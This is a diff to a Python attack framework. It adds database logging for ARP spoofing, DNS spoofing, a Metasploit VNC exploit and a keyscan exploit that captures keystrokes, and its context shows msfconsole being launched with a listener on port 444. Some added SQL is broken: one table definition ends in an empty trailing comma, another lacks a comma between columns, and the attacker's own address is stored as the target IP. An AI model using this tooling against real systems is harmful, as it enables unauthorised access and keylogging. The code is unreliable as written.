@@ -59,6 +59,7 @@ conn.execute('ATTACH DATABASE "Spider.db" as "SpiderDB"')
 def SpiderDB(list):
     cur.execute('''INSERT INTO SpiderDB.Spider (id, Internal_Links, External_Links) VALUES (NULL, ?, ?)
              ''', list)
+    conn.commit()
 def createtables():
     conn.execute('''CREATE TABLE IF NOT EXISTS SpiderDB.Spider
                 (id integer primary key, Internal_Links TEXT, External_Links TEXT)''')
@@ -127,6 +128,14 @@ def createtables():
     conn.commit()
     conn.execute('''CREATE TABLE IF NOT EXISTS APT.Packet_Sniffing
     (id integer primary key, Interface TEXT, Timeout TEXT, Filter TEXT, Packet TEXT)''')
+    conn.commit()
+    conn.execute('''CREATE TABLE IF NOT EXISTS APT.ARP_Spoofing (id integer primary key, Target_IP, Default_Gateway, Verbose,
+                 Target_Mac_Addr)''')
+    conn.commit()
+    conn.execute('''CREATE TABLE IF NOT EXISTS APT.DNS_Spoofing (id integer primary key, )''')
+    conn.commit()
+    conn.execute('''CREATE TABLE IF NOT EXISTS APT.VNC (id integer primary key, Target_IP TEXT, Port TEXT, Exploit TEXT
+                 Payload TEXT, Listening TEXT)''')
     conn.commit()
 
 # def newdatabase(conn):
@@ -1682,6 +1691,10 @@ def vnc_exploit():
     lhost = input("IP Address of this machine: ")
     lport = "444"
     sleep = input("How long do you want to listen for (in seconds)? ")
+    vlist = [lhost, lport, exploit, payload, sleep]
+    cur.execute('''INSERT INTO APT.VNC (id, Target_IP, Port, Exploit, Payload, Listening) VALUES (NULL, ?, ?, ?, ?, ?)
+             ''', vlist)
+    conn.commit()
     
     # Run msfconsole in new terminal
     process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
@@ -1709,6 +1722,10 @@ def keyscan_exploit():
     lport = "444"
     listen_sleep = input("How long do you want to listen for (in seconds)? ")
     keyscan_sleep = input("How long do you want to run the keyscan for (in seconds)? ")
+    klist = [lhost, lport, exploit, payload, listen_sleep, keyscan_sleep]
+    cur.execute('''INSERT INTO APT.Keyscan (id, Target_IP, Port, Exploit, Payload, Listening, Keyscan_Runtime) VALUES (NULL, ?, ?, ?, ?, ?, ?)
+             ''', klist)
+    conn.commit()
     
     # Run msfconsole in new terminal
     process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
